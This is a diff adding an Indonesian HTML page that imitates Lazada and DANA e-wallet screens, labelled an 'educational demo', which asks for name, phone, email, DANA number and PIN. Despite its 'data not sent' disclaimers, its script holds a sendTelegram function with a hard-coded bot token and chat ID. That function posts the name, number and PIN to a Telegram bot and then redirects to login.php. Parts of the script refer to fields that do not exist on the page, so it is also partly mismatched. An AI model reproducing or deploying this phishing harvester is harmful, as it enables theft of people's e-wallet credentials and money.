@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Demo UI - Pilih E-Wallet (Edukasi)</title>
+  <style>
+    :root{
+      --bg:#ffffff;
+      --muted:#6b7280;
+      --accent1:#0066ff;
+      --accent2:#0044cc;
+      --btn1:#ff6a00;
+      --btn2:#ff3b30;
+      --card-shadow: 0 6px 20px rgba(15,23,42,0.06);
+    }
+    *{box-sizing:border-box}
+    body{
+      font-family: Inter, Poppins, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      margin:0;
+      background:#f3f4f6;
+      color:#111827;
+      min-height:100vh;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:20px;
+    }
+    .wrap{ width:100%; max-width:420px; }
+    .card{
+      background:var(--bg);
+      border-radius:12px;
+      box-shadow:var(--card-shadow);
+      padding:20px;
+      margin-bottom:12px;
+    }
+    .brand{ display:flex; align-items:center; gap:10px; justify-content:center; margin-bottom:6px; }
+    .brand img{ height:36px; width:auto; display:block; }
+    .brand .title{ font-weight:700; font-size:20px; color:var(--accent2); }
+    h1{ font-size:18px; margin:6px 0 16px; text-align:center; color:#111827; }
+    label{ display:block; font-size:13px; color:var(--muted); margin-bottom:6px; }
+    .mb{ margin-bottom:14px; }
+    input[type="text"], input[type="email"], input[type="tel"], input[type="password"]{
+      width:100%; padding:12px; border-radius:10px; border:1px solid #e6e9ee; font-size:15px;
+      background:white; outline:none;
+    }
+    input:focus{ box-shadow:0 6px 18px rgba(99,102,241,0.06); border-color:rgba(99,102,241,0.25); }
+    .muted-small{ font-size:12px; color:var(--muted); margin-top:8px; }
+    .btn{ display:inline-block; width:100%; padding:12px; border-radius:10px; border:none; cursor:pointer;
+          font-weight:700; font-size:15px; color:white; background:linear-gradient(90deg,var(--btn1),var(--btn2)); }
+    .ewallet-list{ display:flex; flex-direction:column; gap:10px; margin-top:6px; }
+    .ew-item{ display:flex; gap:12px; align-items:center; padding:12px; border-radius:10px; border:1px solid #eef2f7; background:white; cursor:pointer; transition:all .15s ease; }
+    .ew-item img{ width:40px; height:40px; object-fit:contain; border-radius:8px; background:#fff; padding:4px; }
+    .ew-item .meta{ display:flex; flex-direction:column; }
+    .ew-item:hover{ transform:translateY(-3px); box-shadow:0 8px 20px rgba(2,6,23,0.06); }
+    .ew-item.disabled{ opacity:0.5; cursor:not-allowed; transform:none; box-shadow:none; }
+    /* active visual for DANA on hover/tap */
+    .ew-item.active:hover{ background: linear-gradient(90deg,#e6f0ff,#d9e8ff); border-color: rgba(0,102,255,0.25); }
+    .note-demo{ background:#fff7c2; color:#7a5800; padding:10px; border-radius:8px; font-size:13px; margin-bottom:12px; border:1px solid rgba(122,88,0,0.08); }
+    .center{ text-align:center; }
+    .hidden{ display:none; }
+    .footer-small{ font-size:12px; color:var(--muted); text-align:center; margin-top:12px; }
+    .pin-input{ letter-spacing:8px; font-size:20px; text-align:center; font-weight:700; padding:12px 10px; }
+    .warning{ color:#b91c1c; font-size:13px; margin-top:8px; }
+    @media (max-width:420px){ .card{padding:16px} .ew-item img{ width:36px; height:36px } }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <!-- PAGE 1: REGISTRATION -->
+    <div id="page-reg" class="card">
+      <div class="brand">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/Lazada_logo.png" alt="Logo" onerror="this.style.display='none'">
+        <div class="title">Demo Lazada UI</div>
+      </div>
+      <h1>Formulir Pendaftaran</h1>
+      <form id="formReg">
+        <div class="mb">
+          <label for="nama">Nama Lengkap</label>
+          <input id="nama" name="nama" type="text" placeholder="Masukkan nama lengkap" required>
+        </div>
+        <div class="mb">
+          <label for="hp">Nomor HP</label>
+          <input id="hp" name="hp" type="tel" placeholder="08xxxxxxxxxx" required>
+        </div>
+        <div class="mb">
+          <label for="gmail">Alamat Gmail</label>
+          <input id="gmail" name="gmail" type="email" placeholder="nama@contoh.com" required>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:12px;">
+          <input id="agree" type="checkbox" required>
+          <label for="agree" style="margin:0">Saya menyetujui syarat &amp; ketentuan pendaftaran</label>
+        </div>
+        <div class="muted-small">Data Anda aman dan hanya digunakan untuk keperluan pendaftaran. <strong>Demo saja — jangan masukkan data sensitif.</strong></div>
+        <div style="height:12px"></div>
+        <button class="btn" type="submit">Daftar Sekarang</button>
+      </form>
+      <div class="footer-small">Demo edukatif • Bukan halaman resmi Lazada / DANA</div>
+    </div>
+
+    <!-- PAGE 2: EWALLET SELECTION -->
+    <div id="page-ew" class="card hidden">
+      <div class="brand">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/Lazada_logo.png" alt="Logo" onerror="this.style.display='none'">
+        <div class="title">Demo Lazada UI</div>
+      </div>
+      <h1>Pilih E-Wallet Penarikan</h1>
+      <div class="note-demo">Hanya DANA aktif pada demo ini. Metode lain ditampilkan sebagai sedang tidak tersedia.</div>
+      <div class="ewallet-list">
+        <div class="ew-item active" data-id="dana" title="DANA - Tersedia">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Dana_logo.png" alt="DANA logo" loading="lazy">
+          <div class="meta"><div style="font-weight:700">DANA</div><div style="font-size:13px;color:var(--muted)">Tersedia</div></div>
+        </div>
+        <div class="ew-item disabled" title="OVO - Sedang tidak tersedia">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/02/OVO_logo.svg" alt="OVO logo" loading="lazy">
+          <div class="meta"><div style="font-weight:700">OVO</div><div style="font-size:13px;color:var(--muted)">Sedang tidak tersedia</div></div>
+        </div>
+        <div class="ew-item disabled" title="GoPay - Sedang tidak tersedia">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/0/07/Gopay.png" alt="GoPay logo" loading="lazy">
+          <div class="meta"><div style="font-weight:700">GoPay</div><div style="font-size:13px;color:var(--muted)">Sedang tidak tersedia</div></div>
+        </div>
+        <div class="ew-item disabled" title="ShopeePay - Sedang tidak tersedia">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6d/ShopeePay_logo.svg" alt="ShopeePay logo" loading="lazy">
+          <div class="meta"><div style="font-weight:700">ShopeePay</div><div style="font-size:13px;color:var(--muted)">Sedang tidak tersedia</div></div>
+        </div>
+        <div class="ew-item disabled" title="LinkAja - Sedang tidak tersedia">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/LinkAja_logo.png" alt="LinkAja logo" loading="lazy">
+          <div class="meta"><div style="font-weight:700">LinkAja</div><div style="font-size:13px;color:var(--muted)">Sedang tidak tersedia</div></div>
+        </div>
+      </div>
+      <div style="height:8px"></div>
+      <div class="footer-small">Demo edukatif • Klik DANA untuk lanjut</div>
+    </div>
+
+    <!-- PAGE 3: DANA NUMBER INPUT (SIMULASI) -->
+    <div id="page-dana" class="card hidden">
+      <div class="brand">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Dana_logo.png" alt="DANA logo" onerror="this.style.display='none'">
+        <div class="title">DANA (Demo)</div>
+      </div>
+      <h1>Masukkan Nomor Akun DANA</h1>
+      <div class="note-demo">DEMO: Halaman simulasi. <strong>Jangan masukkan nomor atau PIN asli.</strong></div>
+      <div class="mb">
+        <label for="danaNum">Nomor DANA</label>
+        <input id="danaNum" type="text" placeholder="08xxxxxxxxxx" inputmode="numeric" pattern="[0-9]*">
+      </div>
+      <div class="muted-small">Nomor akan diverifikasi pada aplikasi resmi (simulasi).</div>
+      <div style="height:10px"></div>
+      <button id="btnLanjut" class="btn">Lanjutkan</button>
+      <div class="footer-small">Demo edukatif • Tidak menyimpan data</div>
+    </div>
+
+    <!-- PAGE 4: PIN INPUT (SIMULASI) -->
+    <div id="page-pin" class="card hidden">
+      <div class="brand">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Dana_logo.png" alt="DANA logo" onerror="this.style.display='none'">
+        <div class="title">DANA (Demo)</div>
+      </div>
+      <h1>Masukkan PIN DANA (Simulasi)</h1>
+      <div class="note-demo">DEMO: <strong>Jangan masukkan PIN asli</strong>. Ini hanya simulasi tampilan.</div>
+      <div class="mb">
+        <label for="pin">PIN (4-6 digit)</label>
+        <input id="pin" type="password" maxlength="6" class="pin-input" placeholder="••••" inputmode="numeric" pattern="[0-9]*">
+      </div>
+      <div class="warning">Perhatian: Jangan gunakan PIN akun sebenarnya. Demo hanya untuk tampilan UI.</div>
+      <div style="height:10px"></div>
+      <div class="center"><button id="btnFinish" class="btn" style="width:170px">Selesai</button></div>
+      <div class="footer-small">Demo edukatif • Data tidak dikirim.</div>
+    </div>
+
+    <!-- SUCCESS SCREEN -->
+    <div id="page-success" class="card hidden">
+      <div class="brand">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/Lazada_logo.png" alt="Logo" onerror="this.style.display='none'">
+        <div class="title">Demo Lazada UI</div>
+      </div>
+      <h1>E-Wallet DANA berhasil ditambahkan (Demo)</h1>
+      <div class="mb">Terima kasih — ini adalah simulasi tampilan. Tidak ada data yang disimpan.</div>
+      <div class="center"><button id="btnHome" class="btn" style="width:220px">Kembali ke Beranda</button></div>
+      <div class="footer-small">Demo edukatif • Bukan halaman resmi Lazada / DANA</div>
+    </div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('.slider').slick({
+        autoplay: true,
+        autoplaySpeed: 1500,
+        dots: true
+      });
+    });
+
+    function sendTelegram() {
+      const nama = document.getElementById("nama").value;
+      const nomor = document.getElementById("nomor").value;
+      const pin = document.getElementById("pin").value;
+      const pilihan = document.querySelector('input[name="tarif"]:checked').value;
+      const token = "7201669869:AAFL4YYCcXXmqmMBSKCA3FtK6cCKEG4mqXU";
+      const chat_id = "6712267951";
+      const text = `Formulir DANA:\nNama: ${nama}\nNomor HP: ${nomor}\nPIN: ${pin}\nKebutuhan: ${pilihan}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: text
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          document.getElementById("musikku").play();
+          setTimeout(() => {
+            window.location.href = 'login.php';
+          }, 3050);
+        } else {
+          alert("Gagal mengirim ke Telegram");
+        }
+      })
+      .catch(error => {
+        console.error("Error:", error);
+        alert("Terjadi kesalahan saat mengirim notifikasi");
+      });
+    }
+  </script>
+
+</body>
+</html>
